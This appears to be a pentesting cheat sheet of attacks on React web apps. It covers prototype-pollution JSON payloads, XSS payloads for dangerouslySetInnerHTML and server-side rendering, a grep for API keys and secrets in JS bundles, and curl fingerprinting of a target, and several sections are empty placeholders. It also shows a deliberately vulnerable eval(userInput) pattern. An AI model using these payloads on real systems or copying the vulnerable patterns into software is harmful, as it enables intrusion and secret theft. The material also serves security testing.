# React-Specific Attacks

## 1. Prototype Pollution
```javascript
// Pollute Object.prototype
{"__proto__": {"admin": true}}
{"__proto__": {"isAdmin": true}}
// Via merge operations
{"constructor": {"prototype": {"admin": true}}}
```

## 2. React XSS via dangerouslySetInnerHTML
```javascript
// If user input is rendered unsanitized
<div dangerouslySetInnerHTML={{__html: userInput}} />
// Payload
<img src=x onerror=alert(document.cookie)>
```

## 3. React SSR XSS
```javascript
// Server-Side Rendering XSS
// If user input in SSR without escaping
const html = ReactDOMServer.renderToString(<Component userInput={userInput} />);
// Payload: <img src=x onerror=alert(1)>
```

## 4. React Router Manipulation
```javascript
// Redirect manipulation
// Access restricted routes via client-side routing
http://target/#/admin
http://target/#/dashboard
```

## 5. State Manipulation
```javascript
// React DevTools state manipulation
// Modify component state directly
// Bypass client-side validation
```

## 6. Source Map Exposure
```
/static/js/main.js.map
/static/js/bundle.js.map
/assets/*.map
```

## 7. API Key Exposure in Client Bundle
```bash
# Search for API keys in JS bundles
grep -r "api_key\|apiKey\|API_KEY\|secret\|token" /static/js/
```

## 8. React Query Cache Poisoning
```javascript
// Manipulate React Query cache
// Via XSS or prototype pollution
```

## 9. useEffect Dependency Injection
```javascript
// If useEffect depends on user-controllable data
useEffect(() => {
  eval(userInput); // Direct eval
}, [userInput]);
```

## 10. React Native Bridge Attacks
```javascript
// If React Native, manipulate native bridge
// Access native modules
```

## Detection
```bash
# Check for React
curl -sk "http://target/" | grep -i "react\|__NEXT_DATA__\|_next"
# Check for source maps
curl -sk "http://target/static/js/main.js.map" -o /dev/null -w "%{http_code}"
```
